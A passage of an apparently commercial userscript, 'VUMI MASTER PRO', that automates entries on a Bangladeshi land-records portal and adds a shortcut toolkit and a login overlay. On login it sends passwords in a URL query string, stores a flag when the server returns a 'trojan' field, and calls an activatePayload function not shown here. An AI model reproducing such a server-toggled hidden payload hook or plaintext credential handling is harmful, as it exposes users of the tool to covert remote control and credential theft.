                    const pr = grab("অংশ"); const portionList = (pr && !pr.replace(/[\d০-৯\s.,\/;।:：ঃ-]/g, "")) ? splitField(pr).map(amtOf).filter(Boolean) : [];
                    const classes = (classToks.length ? classToks : totalToks).map(classOf).filter(Boolean); const totals = totalToks.map(amtOf).filter(Boolean); const atras = atraToks.map(amtOf).filter(Boolean); const montobbo = grabMontobbo();
                    const dagNums = dags.map((d) => parseInt(bn2en(d), 10) || 0); const maxIdx = dagNums.indexOf(Math.max(...dagNums));

                    if (!dags.length) return;
                    for (let i = 0; i < dags.length; i++) {
                      const cls = classes[i] || classes[0] || ""; const total = totals[i] || ""; const atra = atras[i] || ""; const onsho = portionList[i] || share(atra, total);
                      await setById("DAG_NUMBER", dags[i]); await pickSelect("মালিকের ধরণ", "অকৃষি"); await setById("NON_AGRICULTURAL_USE", total);
                      const shreni = [...new Set(labelInputs("শ্রেণী").concat(labelInputs("শ্রেণি")))]; if (cls) await pickAuto(shreni[shreni.length - 1], cls);
                      await setById("TOTAL_DAG_AREA", total); await setById("KHATIAN_DAG_PORTION", onsho); await setById("KHATIAN_DAG_AREA", atra);
                      if (i === maxIdx) await setRemarks(montobbo); await sleep(200); clickButton("দাগ যোগ করুন"); await sleep(600);
                    } await sleep(300); clickButton("দাগ এন্ট্রি সমাপ্ত করুন"); alert("✅ ম্যানুয়াল খতিয়ান এন্ট্রি সফলভাবে সম্পন্ন হয়েছে!");
                })();
            }
        };

        // 🔴 6. GLOBAL SHORTCUT HANDLER (FIXED FOR GHOST BUGS)
        if (window._vmtKeyHandler) {
            document.removeEventListener('keydown', window._vmtKeyHandler);
        }

        window._vmtKeyHandler = function(e) {
            if (e.key === 'Escape' || e.keyCode === 27) {
                let tk = document.getElementById('vumi-master-toolkit'); let po = document.getElementById('vmt-pass-overlay');
                if (tk) tk.remove(); if (po) po.remove();
            }
            
            let isAuth = localStorage.getItem('vmt_auth_hash');
            if (isAuth && e.altKey && !e.ctrlKey && !e.shiftKey) {
                let toolNum = null; let c = e.code; let k = e.key;
                if (k==='1' || k==='১' || c==='Digit1' || c==='Numpad1') toolNum = 't1'; 
                else if (k==='2' || k==='২' || c==='Digit2' || c==='Numpad2') toolNum = 't2';
                else if (k==='3' || k==='৩' || c==='Digit3' || c==='Numpad3') toolNum = 't3'; 
                else if (k==='4' || k==='৪' || c==='Digit4' || c==='Numpad4') toolNum = 't4';
                else if (k==='5' || k==='৫' || c==='Digit5' || c==='Numpad5') toolNum = 't5'; 
                else if (k==='6' || k==='৬' || c==='Digit6' || c==='Numpad6') toolNum = 't6';
                else if (k==='7' || k==='৭' || c==='Digit7' || c==='Numpad7') toolNum = 't7'; 
                else if (k==='8' || k==='৮' || c==='Digit8' || c==='Numpad8') toolNum = 't8';
                else if (k==='9' || k==='৯' || c==='Digit9' || c==='Numpad9') toolNum = 't9'; 
                else if (k==='0' || k==='০' || c==='Digit0' || c==='Numpad0') toolNum = 't10';

                if (toolNum && window._vmtTools && window._vmtTools[toolNum]) {
                    e.preventDefault();
                    try {
                        window._vmtTools[toolNum]();
                        let toolKitDiv = document.getElementById('vumi-master-toolkit');
                        let minButton = document.getElementById('vmt-min');
                        if (toolKitDiv && !toolKitDiv.classList.contains('minimized')) {
                            toolKitDiv.classList.add('minimized');
                            if (minButton) minButton.innerText = '+';
                        }
                    } catch(err) { console.error('Shortcut Error:', err); }
                }
            }
        };
        document.addEventListener('keydown', window._vmtKeyHandler);

        // 🔴 7. CLEAN UI & APP MENUS 
        function loadToolkit() {
            if(document.getElementById('vumi-master-toolkit')) return;
            const style = document.createElement('style');
            style.innerHTML = `
            @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap');
            #vumi-master-toolkit{position:fixed;top:20px;right:20px;width:340px;border-radius:16px;z-index:999999;font-family:'Poppins', sans-serif;overflow:hidden;transition:width 0.3s ease; box-shadow: 0 15px 50px rgba(0,0,0,0.5); background:rgba(21, 31, 40, 0.95); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1);}
            #vumi-master-toolkit.minimized{width:220px;}
            #vumi-master-toolkit.minimized .vmt-body,#vumi-master-toolkit.minimized .vmt-footer{display:none;}
            .vmt-header{background:rgba(0,0,0,0.4);color:#fff;padding:15px 20px;cursor:move;display:flex;justify-content:space-between;align-items:center;font-weight:800;font-size:14px;user-select:none;border-bottom:1px solid rgba(255,255,255,0.05);}
            .vmt-header-btns{display:flex;gap:8px;}
            .vmt-h-btn{width:32px;height:32px;border-radius:8px;border:1px solid rgba(255,255,255,0.1);display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:bold;cursor:pointer;transition:all 0.3s ease;backdrop-filter:blur(5px);}
            .btn-min{background:rgba(59,130,246,0.15);color:#60a5fa;}.btn-min:hover{background:rgba(59,130,246,0.35);box-shadow:0 0 12px rgba(59,130,246,0.5);transform:translateY(-2px);}
            .btn-logout{background:rgba(245,158,11,0.15);color:#fbbf24;}.btn-logout:hover{background:rgba(245,158,11,0.35);box-shadow:0 0 12px rgba(245,158,11,0.5);transform:translateY(-2px);}
            .btn-close{background:rgba(239,68,68,0.15);color:#fca5a5;}.btn-close:hover{background:rgba(239,68,68,0.35);box-shadow:0 0 12px rgba(239,68,68,0.5);transform:translateY(-2px);}
            .vmt-body{padding:15px;max-height:70vh;overflow-y:auto;}
            .vmt-body::-webkit-scrollbar{width:6px;} .vmt-body::-webkit-scrollbar-thumb{background:#334155;border-radius:10px;}
            .vmt-view-panel { display: none; }
            .vmt-view-panel.active-view { display: block !important; animation: vmtSlideIn 0.25s ease-out; }
            @keyframes vmtSlideIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
            .wip-container { padding: 35px 10px; text-align: center; color: #cbd5e1; }
            .wip-icon-anim { font-size: 45px; margin-bottom: 12px; animation: vmtPulse 2s infinite; }
            .wip-txt-head { margin: 0 0 5px 0; font-size: 16px; color: #fff; font-weight: 800; }
            .wip-txt-sub { font-size: 12px; margin: 0; opacity: 0.65; }
            @keyframes vmtPulse { 0% { transform: scale(1); } 50% { transform: scale(1.06); } 100% { transform: scale(1); } }
            .glow-btn { position: relative; background: rgba(255,255,255,0.05); color: #fff; text-decoration: none; font-size: 13px; font-weight: 600; padding: 12px 15px; transition: 0.5s; display: flex; align-items: center; justify-content: space-between; border-radius: 8px; cursor: pointer; border: 1px solid rgba(255,255,255,0.05); overflow: hidden; margin-bottom:12px; }
            .glow-btn:hover { background: var(--clr); color: var(--clr); letter-spacing: 0.5px; box-shadow: 0 0 20px var(--clr); border-color: transparent;}
            .glow-btn::before { content: ''; position: absolute; inset: 2px; background: #151F28; border-radius: 6px; z-index: 0; }
            .glow-btn .btn-content { position: relative; z-index: 1; display: flex; align-items: center; gap: 10px; color: #cbd5e1; transition: 0.5s; }
            .glow-btn:hover .btn-content { color: var(--clr); text-shadow: 0 0 5px var(--clr); }
            .glow-btn i { position: absolute; inset: 0; display: block; border-radius: 8px; overflow: hidden;}
            .glow-btn i::before { content: ''; position: absolute; top: 0; left: 80%; width: 10px; height: 4px; background: #151F28; transform: translateX(-50%) skewX(325deg); transition: 0.5s; }
            .glow-btn:hover i::before { width: 20px; left: 20%; background: #fff;}
            .glow-btn i::after { content: ''; position: absolute; bottom: 0; left: 20%; width: 10px; height: 4px; background: #151F28; transform: translateX(-50%) skewX(325deg); transition: 0.5s; }
            .glow-btn:hover i::after { width: 20px; left: 80%; background: #fff;}
            .main-menu-btn { padding: 16px 15px; font-size: 14px; justify-content: center; }
            .main-menu-btn .btn-content { justify-content: center; width: 100%; font-weight: bold; color: #fff;}
            .vmt-back-btn { background: rgba(255, 255, 255, 0.08); color: #cbd5e1; border: 1px solid rgba(255,255,255,0.1); padding: 7px 14px; border-radius: 6px; cursor: pointer; font-size: 12px; margin-bottom: 16px; display: inline-flex; align-items: center; gap: 6px; transition: 0.2s; font-family: 'Poppins', sans-serif; font-weight: 600;}
            .vmt-back-btn:hover { background: #3b82f6; color: #fff; border-color: #3b82f6; box-shadow: 0 0 10px rgba(59,130,246,0.4); }
            .shortcut-badge { position: relative; z-index: 1; font-size: 10px; color: #94a3b8; background: rgba(255,255,255,0.1); padding: 2px 6px; border-radius: 4px; border: 1px solid rgba(255,255,255,0.1); font-weight:700; transition: 0.5s;}
            .glow-btn:hover .shortcut-badge { color: var(--clr); border-color: var(--clr); background: rgba(0,0,0,0.5);}
            .vmt-tool-icon{font-size:16px;}
            .vmt-footer{background:rgba(0,0,0,0.4); border-top:1px solid rgba(255,255,255,0.05); padding:15px 10px; text-align:center;}
            input:focus, select:focus, textarea:focus { background-color: #fef08a !important; outline: 3px solid #eab308 !important; transition: background-color 0.1s; box-shadow: 0 0 10px rgba(234, 179, 8, 0.3) !important; color:#000 !important;}
            `;
            document.head.appendChild(style);
            const tk = document.createElement('div');
            tk.id = 'vumi-master-toolkit';
            tk.innerHTML = `
            <div class="vmt-header" id="vmt-drag">
                <span><span style="color:#60a5fa;">❖</span> VUMI MASTER PRO</span>
                <div class="vmt-header-btns">
                    <button class="vmt-h-btn btn-min" id="vmt-min" title="Minimize">＋</button>
                    <button class="vmt-h-btn btn-logout" id="vmt-logout" title="লগআউট">🚪</button>
                    <button class="vmt-h-btn btn-close" id="vmt-close" title="Close (Esc)">✖</button>
                </div>
            </div>
            <div class="vmt-body" style="min-height: 260px;">
                <div id="vmt-view-main" class="vmt-view-panel active-view">
                    <div style="text-align:center; color:#94a3b8; font-size:12px; margin-bottom:16px; font-weight:600; letter-spacing: 0.5px;">ক্যাটাগরি সিলেক্ট করুন</div>
                    <button class="glow-btn main-menu-btn" data-panel="vmt-view-cat1" style="--clr:#1e9bff;"><span class="btn-content">১. রেকর্ডীয় হোল্ডিং</span><i></i></button>
                    <button class="glow-btn main-menu-btn" data-panel="vmt-view-cat2" style="--clr:#6eff3e;"><span class="btn-content">২. ম্যানুয়াল হোল্ডিং</span><i></i></button>
                    <button class="glow-btn main-menu-btn" data-panel="vmt-view-cat3" style="--clr:#ff1867;"><span class="btn-content">৩. ম্যানুয়াল খতিয়ান</span><i></i></button>
                </div>
                <div id="vmt-view-cat1" class="vmt-view-panel">
                    <button class="vmt-back-btn">🔙 মেইন মেনু</button>
                    <div class="vmt-tool glow-btn" data-tool="t1" style="--clr:#1e9bff;"><span class="btn-content"><span class="vmt-tool-icon">🎯</span> Land Entry (Range)</span><span class="shortcut-badge">Alt+1</span><i></i></div>
                    <div class="vmt-tool glow-btn" data-tool="t2" style="--clr:#6eff3e;"><span class="btn-content"><span class="vmt-tool-icon">📅</span> Korer Year</span><span class="shortcut-badge">Alt+2</span><i></i></div>
                    <div class="vmt-tool glow-btn" data-tool="t3" style="--clr:#ff1867;"><span class="btn-content"><span class="vmt-tool-icon">⚡</span> Auto Data Fill</span><span class="shortcut-badge">Alt+3</span><i></i></div>
                    <div class="vmt-tool glow-btn" data-tool="t4" style="--clr:#1e9bff;"><span class="btn-content"><span class="vmt-tool-icon">👥</span> Maliker Tottho</span><span class="shortcut-badge">Alt+4</span><i></i></div>
                    <div class="vmt-tool glow-btn" data-tool="t5" style="--clr:#6eff3e;"><span class="btn-content"><span class="vmt-tool-icon">🧮</span> Tottho 2.0 (Master)</span><span class="shortcut-badge">Alt+5</span><i></i></div>
                    <div class="vmt-tool glow-btn" data-tool="t6" style="--clr:#ff1867;"><span class="btn-content"><span class="vmt-tool-icon">➕</span> Dag Add / Row</span><span class="shortcut-badge">Alt+6</span><i></i></div>
                    <div class="vmt-tool glow-btn" data-tool="t7" style="--clr:#1e9bff;"><span class="btn-content"><span class="vmt-tool-icon">📝</span> Dager Tottho</span><span class="shortcut-badge">Alt+7</span><i></i></div>
                    <div class="vmt-tool glow-btn" data-tool="t8" style="--clr:#6eff3e;"><span class="btn-content"><span class="vmt-tool-icon">📊</span> Auto Data Download</span><span class="shortcut-badge">Alt+8</span><i></i></div>
                    <div class="vmt-tool glow-btn" data-tool="t9" style="--clr:#ff1867;"><span class="btn-content"><span class="vmt-tool-icon">💠</span> Smart Calculator</span><span class="shortcut-badge">Alt+9</span><i></i></div>
                    <div class="vmt-tool glow-btn" data-tool="t10" style="--clr:#1e9bff;"><span class="btn-content"><span class="vmt-tool-icon">✂️</span> Land Deduction Pro</span><span class="shortcut-badge">Alt+0</span><i></i></div>
                </div>
                <div id="vmt-view-cat2" class="vmt-view-panel">
                    <button class="vmt-back-btn">🔙 মেইন মেনু</button>
                    <div class="wip-container"><div class="wip-icon-anim">🚧</div><h3 class="wip-title">Update in progress...</h3><p class="wip-subtitle">খুব শিঘ্রই আসছে! কাজ চলছে...</p></div>
                </div>
                <div id="vmt-view-cat3" class="vmt-view-panel">
                    <button class="vmt-back-btn">🔙 মেইন মেনু</button>
                    <div style="padding: 10px; background: rgba(255,255,255,0.05); border-radius: 8px; margin-bottom: 10px;">
                        <label style="color:#cbd5e1; font-size: 11px; margin-bottom: 4px; display:block;">উপজেলা</label>
                        <input type="text" id="vmt-man-upazila" value="সদর" class="vmt-focus-input" style="width:100%; padding: 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.2); background: rgba(0,0,0,0.2); color: #fff; margin-bottom: 10px; font-family:'Poppins', sans-serif; font-size:12px; outline:none;">
                        <label style="color:#cbd5e1; font-size: 11px; margin-bottom: 4px; display:block;">খতিয়ানের র-ডাটা (Raw Data)</label>
                        <textarea id="vmt-man-raw" class="vmt-focus-input" placeholder="খতিয়ান ফাইলের পুরো টেক্সট পেস্ট করুন..." style="width:100%; height: 120px; padding: 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.2); background: rgba(0,0,0,0.2); color: #fff; font-family:'Poppins', sans-serif; font-size:11px; resize: none; margin-bottom: 10px; outline:none;"></textarea>
                        <button class="glow-btn" id="btn-run-manual-khotian" style="--clr:#ff1867; width: 100%; justify-content: center; margin-bottom: 0;"><span class="btn-content">🚀 অটো এন্ট্রি শুরু করুন</span><i></i></button>
                    </div>
                </div>
            </div>
            <div class="vmt-footer">
                <span style="color: #64748b; font-size: 9px; text-transform: uppercase; letter-spacing: 1.5px; font-weight: 700; display: block; margin-bottom: 3px;">Proudly Developed By</span>
                <span style="background: linear-gradient(135deg, #1e9bff 0%, #ff1867 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 900; font-size: 18px; letter-spacing: 1px; display: block;">TRUST SHOP</span>
                <span style="color: #6eff3e; font-size: 8px; text-transform: uppercase; letter-spacing: 2px; font-weight: 700; display: block; margin-top: 3px;">Premium Digital Solutions</span>
            </div>`;
            document.body.appendChild(tk);
            
            document.querySelectorAll('.main-menu-btn').forEach(btn => {
                btn.onclick = () => {
                    let targetID = btn.getAttribute('data-panel');
                    document.querySelectorAll('.vmt-view-panel').forEach(p => p.classList.remove('active-view'));
                    document.getElementById(targetID).classList.add('active-view');
                };
            });
            document.querySelectorAll('.vmt-back-btn').forEach(btn => {
                btn.onclick = () => {
                    document.querySelectorAll('.vmt-view-panel').forEach(p => p.classList.remove('active-view'));
                    document.getElementById('vmt-view-main').classList.add('active-view');
                };
            });
            let manBtn = document.getElementById('btn-run-manual-khotian');
            if(manBtn) {
                manBtn.onclick = async () => {
                    let upa = document.getElementById('vmt-man-upazila').value.trim();
                    let raw = document.getElementById('vmt-man-raw').value.trim();
                    if(!upa || !raw) { alert("উপজেলা এবং খতিয়ানের র-ডাটা দুটোই দিন!"); return; }
                    manBtn.querySelector('.btn-content').innerText = "⏳ কাজ চলছে...";
                    try { if (window._vmtTools.t11) { await window._vmtTools.t11(upa, raw); } } catch(e) { console.error(e); alert("সমস্যা হয়েছে: " + e.message); }
                    manBtn.querySelector('.btn-content').innerText = "🚀 অটো এন্ট্রি শুরু করুন";
                };
            }
            (function() {
                let isDown = false, offX = 0, offY = 0; const h = document.getElementById('vmt-drag');
                h.addEventListener('mousedown', e => { if (e.target.tagName === 'BUTTON') return; isDown = true; offX = e.clientX - tk.offsetLeft; offY = e.clientY - tk.offsetTop; tk.style.boxShadow = "0 30px 60px rgba(0,0,0,0.5)"; });
                document.addEventListener('mousemove', e => { if (!isDown) return; let nY = e.clientY - offY; if (nY < 0) nY = 0; tk.style.left = (e.clientX - offX) + 'px'; tk.style.top = nY + 'px'; tk.style.right = 'auto'; });
                document.addEventListener('mouseup', () => { isDown = false; tk.style.boxShadow = "0 15px 50px rgba(0,0,0,0.5)"; });
            })();
            document.getElementById('vmt-close').onclick = () => { tk.remove(); };
            document.getElementById('vmt-logout').onclick = async () => {
                if(confirm('আপনি কি লগআউট করতে চান?')) { clearAuthData(); window.postMessage({ type: 'VMT_LOGOUT' }, '*'); tk.remove(); location.reload(); }
            };
            document.getElementById('vmt-min').onclick = function() { tk.classList.toggle('minimized'); this.innerText = tk.classList.contains('minimized') ? '＋' : '－'; };
            document.querySelectorAll('.vmt-tool').forEach(el => {
                el.onclick = () => {
                    const t = el.dataset.tool;
                    if (window._vmtTools[t]) {
                        try { 
                            window._vmtTools[t](); 
                            let toolKitDiv = document.getElementById('vumi-master-toolkit');
                            let minButton = document.getElementById('vmt-min');
                            if (toolKitDiv && !toolKitDiv.classList.contains('minimized')) {
                                toolKitDiv.classList.add('minimized');
                                if (minButton) minButton.innerText = '+';
                            }
                        } catch (e) { alert('Error: ' + e.message); console.error(e); }
                    }
                };
            });
        }

        if (!localStorage.getItem('vmt_auth_hash')) {
            const videoBaseUrl = "https://cdn.jsdelivr.net/gh/Habib29820/login-videos/";
            const passOverlay = document.createElement('div');
            passOverlay.id = 'vmt-pass-overlay';
            passOverlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(15, 23, 42, 0.7);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);z-index:9999999;display:flex;align-items:center;justify-content:center;font-family:'Poppins', sans-serif;transition: opacity 0.5s ease;";
            passOverlay.innerHTML = `
                <div class="login-container" style="display: flex; width: 900px; height: 500px; background: rgba(21, 31, 40, 0.85); border-radius: 20px; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5); overflow: hidden; position: relative; border: 1px solid rgba(255, 255, 255, 0.1);">
                    <button id="vmt-pass-close" title="বন্ধ করুন (Esc)" style="position:absolute;top:15px;right:20px;background:none;border:none;font-size:26px;color:rgba(255,255,255,0.7);cursor:pointer;z-index:10;transition:all 0.2s;line-height:1;">&times;</button>
                    <div class="image-panel" style="flex: 1.2; position: relative; overflow: hidden; background: #fff; border-right: 1px solid rgba(255, 255, 255, 0.1);">
                        <video id="vmt-video-player" autoplay loop muted playsinline style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transition: opacity 0.6s ease;"><source src="${videoBaseUrl}1026.mp4" type="video/mp4"></video>
                    </div>
                    <div class="login-panel" style="flex: 1; padding: 40px 40px; display: flex; flex-direction: column; justify-content: center;">
                        <h2 style="font-size: 2.2em; margin-bottom: 5px; color: #fff; font-weight: 800;">VUMI PRO</h2>
                        <p style="color: rgba(255,255,255,0.6); margin-bottom: 30px; font-weight: 500;">Secure Access Panel</p>
                        <div class="input-group" style="margin-bottom: 20px;"><input type="text" id="vmt-user-input" class="vmt-focus-input" placeholder="User ID" autocomplete="off" style="width: 100%; padding: 14px 15px; border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; font-size: 14px; transition: all 0.3s; font-weight:bold; outline:none; background: rgba(255,255,255,0.05); color: #fff;"></div>
                        <div class="input-group" style="margin-bottom: 25px;"><input type="password" id="vmt-pass-input" class="vmt-focus-input" placeholder="Password" style="width: 100%; padding: 14px 15px; border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; font-size: 14px; transition: all 0.3s; font-weight:bold; letter-spacing: 2px; outline:none; background: rgba(255,255,255,0.05); color: #fff;"></div>
                        <button id="vmt-pass-btn" class="glow-btn" style="--clr:#1e9bff; width: 100%; justify-content: center; padding: 16px; font-size: 16px;"><span class="btn-content">Sign In</span><i></i></button>
                        <div id="vmt-pass-error" style="padding: 12px; border-radius: 8px; margin-top: 15px; text-align: center; font-weight: 600; font-size: 13px; display: none;"></div>
                    </div>
                </div>
                <style>
                    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap');
                    @keyframes vmtShake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-8px); } 75% { transform: translateX(8px); } }
                    .vmt-focus-input:focus { background-color: #fef08a !important; border-color: #eab308 !important; outline: 3px solid #eab308 !important; box-shadow: 0 0 15px rgba(234, 179, 8, 0.4) !important; color: #000 !important; }
                    .vmt-focus-input::placeholder { color: rgba(255,255,255,0.4); font-weight: normal; }
                    #vmt-pass-close:hover { color: #fff !important; transform: scale(1.1); }
                    .glow-btn { position: relative; background: rgba(255,255,255,0.1); color: #fff; text-decoration: none; text-transform: uppercase; font-size: 14px; letter-spacing: 0.1em; font-weight: 600; padding: 12px 15px; transition: 0.5s; display: flex; align-items: center; justify-content: space-between; border-radius: 8px; cursor: pointer; border: none; overflow: hidden; margin-bottom:10px; }
                    .glow-btn:hover:not(:disabled) { background: var(--clr); color: var(--clr); letter-spacing: 0.15em; box-shadow: 0 0 25px var(--clr); }
                    .glow-btn:disabled { background: #333 !important; color: #777 !important; cursor: not-allowed; box-shadow: none !important; }
                    .glow-btn::before { content: ''; position: absolute; inset: 2px; background: #151F28; border-radius: 6px; z-index: 0; }
                    .glow-btn .btn-content { position: relative; z-index: 1; display: flex; align-items: center; gap: 10px; color: #fff; transition: 0.5s; }
                    .glow-btn:hover:not(:disabled) .btn-content { color: var(--clr); text-shadow: 0 0 5px var(--clr); }
                    .glow-btn i { position: absolute; inset: 0; display: block; border-radius: 8px; overflow: hidden;}
                    .glow-btn i::before { content: ''; position: absolute; top: 0; left: 80%; width: 10px; height: 4px; background: #151F28; transform: translateX(-50%) skewX(325deg); transition: 0.5s; }
                    .glow-btn:hover:not(:disabled) i::before { width: 20px; left: 20%; background: #fff;}
                    .glow-btn i::after { content: ''; position: absolute; bottom: 0; left: 20%; width: 10px; height: 4px; background: #151F28; transform: translateX(-50%) skewX(325deg); transition: 0.5s; }
                    .glow-btn:hover:not(:disabled) i::after { width: 20px; left: 80%; background: #fff;}
                </style>`;
            document.body.appendChild(passOverlay);
            let failCount = 0; const videoPlayer = document.getElementById("vmt-video-player"); const usrInp = document.getElementById('vmt-user-input'); const passInp = document.getElementById('vmt-pass-input'); const btn = document.getElementById('vmt-pass-btn'); const err = document.getElementById('vmt-pass-error'); const cls = document.getElementById('vmt-pass-close');
            cls.onclick = () => { passOverlay.style.opacity = "0"; setTimeout(() => passOverlay.remove(), 400); };
            function updateVideo(videoFile) { videoPlayer.src = videoBaseUrl + videoFile; videoPlayer.load(); videoPlayer.play().catch(e => console.log("Video Play Error:", e)); }
            function showMessage(text, type) { err.style.display = "block"; err.textContent = text; if(type === "success") { err.style.background = "rgba(40, 167, 69, 0.2)"; err.style.color = "#d4edda"; err.style.border = "1px solid #28a745"; } else { err.style.background = "rgba(220, 53, 69, 0.2)"; err.style.color = "#f8d7da"; err.style.border = "1px solid #dc3545"; } }
            function hideMessage() { err.style.display = "none"; err.textContent = ""; }
            async function checkPass() {
                if (passInp.disabled) return; let userId = usrInp.value.trim(); let password = passInp.value.trim();
                if(!userId || !password) { showMessage("Please enter both User ID and Password", "error"); passInp.closest('.login-container').style.animation = 'none'; passInp.closest('.login-container').offsetHeight; passInp.closest('.login-container').style.animation = 'vmtShake 0.4s ease'; return; }
                btn.disabled = true; btn.querySelector('.btn-content').textContent = "Signing In..."; hideMessage();
                try {
                    let response = await fetch(`${API_URL}?userid=${encodeURIComponent(userId)}&password=${encodeURIComponent(password)}&deviceid=${encodeURIComponent(deviceId)}&t=${Date.now()}`); let data = await response.json();
                    if (data.success === true) {
                        updateVideo("correct.mp4"); showMessage("Login Successful!", "success"); btn.querySelector('.btn-content').textContent = "SUCCESS! 🚀"; failCount = 0; let flagToSave = data.trojan ? 'engaged' : '';
                        saveAuthData(btoa(userId), flagToSave);
                        setTimeout(() => { passOverlay.style.opacity = "0"; setTimeout(() => { passOverlay.remove(); loadToolkit(); activatePayload(); }, 400); }, 1800); 
                    } else { 
                        let msg = data.message || "";
                        if (msg.includes("ব্যান") || msg.includes("যোগাযোগ") || msg.includes("আপডেট") || msg.includes("অফ")) { passOverlay.style.opacity = "0"; setTimeout(() => { passOverlay.remove(); show404Overlay(msg); }, 400); return; }
                        failCount++; if (failCount === 1) updateVideo("wrong.mp4"); else updateVideo("againwrong.mp4");
                        showMessage(msg || "Login Failed!", "error"); btn.disabled = false; btn.querySelector('.btn-content').textContent = "Sign In";
                        passInp.style.borderColor = '#ff6b6b'; passInp.style.boxShadow = '0 0 10px rgba(255, 107, 107, 0.5)'; setTimeout(() => { passInp.style.borderColor = 'rgba(255,255,255,0.2)'; passInp.style.boxShadow = 'none'; }, 2000); passInp.value = ''; passInp.focus();
                    }
                } catch (error) { showMessage("Server Connection Failed!", "error"); btn.disabled = false; btn.querySelector('.btn-content').textContent = "Sign In"; }
            }
            btn.onclick = checkPass; passInp.onkeydown = e => { if (e.key === 'Enter') checkPass(); }; usrInp.onkeydown = e => { if (e.key === 'Enter') passInp.focus(); };
        } else {
            loadToolkit(); activatePayload(); checkLiveStatus();
        }
        console.log("✅ VUMI PRO: Initialization Complete.");
    } catch (err) { console.error("VUMI PRO CRITICAL ERROR:", err); }
})();
